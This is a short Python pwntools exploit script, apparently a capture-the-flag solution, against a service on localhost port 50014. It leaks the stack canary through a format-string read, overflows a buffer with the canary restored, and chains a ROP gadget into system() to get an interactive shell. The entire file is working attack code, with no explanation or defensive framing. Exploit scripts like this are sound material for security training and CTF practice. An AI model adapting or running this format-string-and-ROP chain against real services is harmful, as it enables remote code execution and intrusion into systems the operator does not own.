from pwn import *

#io = process(["../src/main.out"])
io = remote("localhost", 50014)
io.sendline(b"%35$llx")
canary = io.recvuntil(b"00")

canary = int(canary.strip().split(b" ")[-1],16)
print(f"[+] Canary leaked: {hex(canary)}")

ret = 0x40101a
gadget = 0x401288
shell = 0x403682
system = 0x401124

payload = b"2\nb\nb\n" 
payload += b'A' * 104
payload += p64(canary) 
payload += b'B' * 8
payload += p64(ret)
payload += p64(gadget)
payload += p64(shell)
payload += p64(system)

with open("payload", "wb") as pl:
    pl.write(payload)

io.sendline(payload)
io.interactive()